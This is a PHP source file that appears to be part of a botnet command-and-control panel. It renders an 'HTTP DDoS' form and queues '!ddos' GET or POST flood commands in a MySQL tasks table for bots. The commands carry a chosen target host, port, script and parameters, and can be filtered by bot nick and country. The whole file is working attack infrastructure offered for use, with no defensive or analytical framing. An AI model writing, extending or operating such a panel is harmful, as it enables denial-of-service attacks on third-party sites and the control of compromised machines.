 <?php

 include "options.php";
 global $mysql;

    if (@!mysql_connect($mysql['host'], $mysql['user'], $mysql['pass']))
         die("Ops! Cant connect to MySQL server.");

    if (@!mysql_select_db($mysql['dbname']))
         die("mysql_select_db() error.");

 $ccode = array(
        "", "AP", "EU", "AD", "AE", "AF", "AG", "AI", "AL", "AM", "AN", "AO", "AQ",
        "AR", "AS", "AT", "AU", "AW", "AZ", "BA", "BB", "BD", "BE", "BF", "BG", "BH",
        "BI", "BJ", "BM", "BN", "BO", "BR", "BS", "BT", "BV", "BW", "BY", "BZ", "CA",
        "CC", "CD", "CF", "CG", "CH", "CI", "CK", "CL", "CM", "CN", "CO", "CR", "CU",
        "CV", "CX", "CY", "CZ", "DE", "DJ", "DK", "DM", "DO", "DZ", "EC", "EE", "EG",
        "EH", "ER", "ES", "ET", "FI", "FJ", "FK", "FM", "FO", "FR", "FX", "GA", "GB",
        "GD", "GE", "GF", "GH", "GI", "GL", "GM", "GN", "GP", "GQ", "GR", "GS", "GT",
        "GU", "GW", "GY", "HK", "HM", "HN", "HR", "HT", "HU", "ID", "IE", "IL", "IN",
        "IO", "IQ", "IR", "IS", "IT", "JM", "JO", "JP", "KE", "KG", "KH", "KI", "KM",
        "KN", "KP", "KR", "KW", "KY", "KZ", "LA", "LB", "LC", "LI", "LK", "LR", "LS",
        "LT", "LU", "LV", "LY", "MA", "MC", "MD", "MG", "MH", "MK", "ML", "MM", "MN",
        "MO", "MP", "MQ", "MR", "MS", "MT", "MU", "MV", "MW", "MX", "MY", "MZ", "NA",
        "NC", "NE", "NF", "NG", "NI", "NL", "NO", "NP", "NR", "NU", "NZ", "OM", "PA",
        "PE", "PF", "PG", "PH", "PK", "PL", "PM", "PN", "PR", "PS", "PT", "PW", "PY",
        "QA", "RE", "RO", "RU", "RW", "SA", "SB", "SC", "SD", "SE", "SG", "SH", "SI",
        "SJ", "SK", "SL", "SM", "SN", "SO", "SR", "ST", "SV", "SY", "SZ", "TC", "TD",
        "TF", "TG", "TH", "TJ", "TK", "TM", "TN", "TO", "TP", "TR", "TT", "TV", "TW",
        "TZ", "UA", "UG", "UM", "US", "UY", "UZ", "VA", "VC", "VE", "VG", "VI", "VN",
        "VU", "WF", "WS", "YE", "YT", "CS", "ZA", "ZM", "ZR", "ZW", "A1", "A2", "O1"
        );

 $cname = array(
	"", "Asia/Pacific Region", "Europe", "Andorra", "United Arab Emirates",
	"Afghanistan", "Antigua and Barbuda", "Anguilla", "Albania", "Armenia",
	"Netherlands Antilles", "Angola", "Antarctica", "Argentina", "American Samoa",
	"Austria", "Australia", "Aruba", "Azerbaijan", "Bosnia and Herzegovina",
	"Barbados", "Bangladesh", "Belgium", "Burkina Faso", "Bulgaria", "Bahrain",
	"Burundi", "Benin", "Bermuda", "Brunei Darussalam", "Bolivia", "Brazil",
	"Bahamas", "Bhutan", "Bouvet Island", "Botswana", "Belarus", "Belize",
	"Canada", "Cocos (Keeling) Islands", "Congo, The Democratic Republic of the",
	"Central African Republic", "Congo", "Switzerland", "Cote D'Ivoire", "Cook Islands",
	"Chile", "Cameroon", "China", "Colombia", "Costa Rica", "Cuba", "Cape Verde",
	"Christmas Island", "Cyprus", "Czech Republic", "Germany", "Djibouti",
	"Denmark", "Dominica", "Dominican Republic", "Algeria", "Ecuador", "Estonia",
	"Egypt", "Western Sahara", "Eritrea", "Spain", "Ethiopia", "Finland", "Fiji",
	"Falkland Islands (Malvinas)", "Micronesia, Federated States of", "Faroe Islands",
	"France", "France, Metropolitan", "Gabon", "United Kingdom",
	"Grenada", "Georgia", "French Guiana", "Ghana", "Gibraltar", "Greenland",
	"Gambia", "Guinea", "Guadeloupe", "Equatorial Guinea", "Greece",
	"South Georgia and the South Sandwich Islands", "Guatemala", "Guam", "Guinea-Bissau",
	"Guyana", "Hong Kong", "Heard Island and McDonald Islands", "Honduras",
	"Croatia", "Haiti", "Hungary", "Indonesia", "Ireland", "Israel", "India",
	"British Indian Ocean Territory", "Iraq", "Iran, Islamic Republic of",
	"Iceland", "Italy", "Jamaica", "Jordan", "Japan", "Kenya", "Kyrgyzstan",
	"Cambodia", "Kiribati", "Comoros", "Saint Kitts and Nevis", "Korea, Democratic People's Republic of",
	"Korea, Republic of", "Kuwait", "Cayman Islands",
	"Kazakstan", "Lao People's Democratic Republic", "Lebanon", "Saint Lucia",
	"Liechtenstein", "Sri Lanka", "Liberia", "Lesotho", "Lithuania", "Luxembourg",
	"Latvia", "Libyan Arab Jamahiriya", "Morocco", "Monaco", "Moldova, Republic of",
	"Madagascar", "Marshall Islands", "Macedonia", "Mali", "Myanmar", "Mongolia", "Macau", "Northern Mariana Islands",
	"Martinique", "Mauritania", "Montserrat", "Malta", "Mauritius", "Maldives",
	"Malawi", "Mexico", "Malaysia", "Mozambique", "Namibia", "New Caledonia",
	"Niger", "Norfolk Island", "Nigeria", "Nicaragua", "Netherlands", "Norway",
	"Nepal", "Nauru", "Niue", "New Zealand", "Oman", "Panama", "Peru", "French Polynesia",
	"Papua New Guinea", "Philippines", "Pakistan", "Poland", "Saint Pierre and Miquelon",
	"Pitcairn Islands", "Puerto Rico", "Palestinian Territory",
	"Portugal", "Palau", "Paraguay", "Qatar", "Reunion", "Romania",
	"Russian Federation", "Rwanda", "Saudi Arabia", "Solomon Islands",
	"Seychelles", "Sudan", "Sweden", "Singapore", "Saint Helena", "Slovenia",
	"Svalbard and Jan Mayen", "Slovakia", "Sierra Leone", "San Marino", "Senegal",
	"Somalia", "Suriname", "Sao Tome and Principe", "El Salvador", "Syrian Arab Republic",
	"Swaziland", "Turks and Caicos Islands", "Chad", "French Southern Territories",
	"Togo", "Thailand", "Tajikistan", "Tokelau", "Turkmenistan",
	"Tunisia", "Tonga", "East Timor", "Turkey", "Trinidad and Tobago", "Tuvalu",
	"Taiwan", "Tanzania, United Republic of", "Ukraine",
	"Uganda", "United States Minor Outlying Islands", "United States", "Uruguay",
	"Uzbekistan", "Holy See (Vatican City State)", "Saint Vincent and the Grenadines",
	"Venezuela", "Virgin Islands, British", "Virgin Islands, U.S.",
	"Vietnam", "Vanuatu", "Wallis and Futuna", "Samoa", "Yemen", "Mayotte",
	"Serbia and Montenegro", "South Africa", "Zambia", "Zaire", "Zimbabwe",
	"Anonymous Proxy","Satellite Provider","Other");

    $countries = "<select name=\"cntry\">";
    $countries .= "<option value =\"all\" selected>For ALL</option>\n";
    for($ii = 1; $ii < 247; $ii++){
      $countries .= "<option value=\"$ccode[$ii]\">$cname[$ii]</option>\n";
    }
    $countries .= "</select>";
 ?>
 <?php

	$ddos_cmd = addslashes($_POST['ddos_cmd']);
	$ddos_nick = addslashes($_POST['ddos_nick']);
	$ddos_exec_on = addslashes($_POST['ddos_exec_on']);
	$cntry = addslashes($_POST['cntry']);
	$ddos_type = addslashes($_POST['ddos_type']);
	$ddos_host = addslashes($_POST['ddos_host']);
	$ddos_port = addslashes($_POST['ddos_port']);
	$ddos_script = addslashes($_POST['ddos_script']);
	$ddos_param = addslashes($_POST['ddos_param']);
	$ddos_autch = addslashes($_POST['ddos_autch']);
	$ddos_login = addslashes($_POST['ddos_login']);
	$ddos_password = addslashes($_POST['ddos_password']);

    if($ddos_cmd){
	$command  = "!ddos";
	$command .= " ";
	if($ddos_type == "ddos_get"){
		$command .= "get";
	}
	if($ddos_type == "ddos_post"){
		$command .= "post";
	}
	$command .= " ";
	$command .= $ddos_host;
	$command .= " ";
	$command .= $ddos_port;
	$command .= " ";
	$command .= $ddos_script;
	$command .= " ";
	$command .= $ddos_param;
	$command .= " ";
	if($ddos_autch == ""){
		$ddos_autch = "0";
	}
	$command .= $ddos_autch;
	$command .= " ";
	$command .= $ddos_login;
	$command .= " ";
	$command .= $ddos_password;
	trim($command);
	if (!$ddos_nick) $ddos_nick = "mass";
        	$r = mysql_query("select * from tasks where nick='$ddos_nick' and country='$cntry'");
	if (mysql_num_rows($r))
        	mysql_query("update tasks set command='$command', bnum='$ddos_exec_on', executed='0' where nick='$ddos_nick' and country='$cntry'");
	else
        	mysql_query("insert into tasks values ('$ddos_nick', '$command', '$ddos_exec_on', '0', '$cntry')");
    }

 ?>
 <html>
 <head>
 <META HTTP-EQUIV="Refresh" CONTENT="<?=$refresh_rate?>; URL=<?=$refer?>">
 <LINK href=style.css type=text/css rel=StyleSheet>
 </head>
 <body>
 <center>

 <hr>
 <h1>HTTP DDoS:</h1>
 <form method=POST>
 <table width=800 border="0">
  <tr>
    <td>Bot Nick:</td>
    <td><input type=text name=ddos_nick value=mass></td>
  </tr>
  <tr>
    <td>Execute on:</td>
    <td><input type=text name=ddos_exec_on size=5 value=0></td>
  </tr>
  <tr>
    <td>For countrie:</td>
    <td><?php print"$countries"; ?></td>
  </tr>
  <tr>
    <td>DDoS type:</td>
    <td>
	<select name="ddos_type">
	<option value="ddos_get" selected>GET</option>
	<option value="ddos_post">POST</option>
	</select>		
    </td>
  </tr>
  <tr>
    <td>Target host:</td>
    <td><input type=text name=ddos_host value=target.com></td>
  </tr>
  <tr>
    <td>Target port:</td>
    <td><input type=text name=ddos_port size=5 value=80></td>
  </tr>
  <tr>
    <td>Target script:</td>
    <td><input type=text name=ddos_script value=/index.php></td>
  </tr>
  <tr>
    <td>Parametrs:</td>
    <td><input type=text name=ddos_param size=100 value="?login=Test&email=test@test.com&text=Simple text&button=Send"></td>
  </tr>
  <tr>
    <td>Use authorization:</td>
    <td><input type="radio" name="ddos_autch" value="1"></td>
  </tr>
  <tr>
    <td>Auth login:</td>
    <td><input type=text name=ddos_login value=login></td>
  </tr>
  <tr>
    <td>Auth password:</td>
    <td><input type=text name=ddos_password value=pass></td>
  </tr>
  <tr>
    <td>&nbsp;</td>
    <td><input type=submit name=ddos_cmd value="Set new command!"></td>
  </tr>
 </table>
 </form>
 <hr>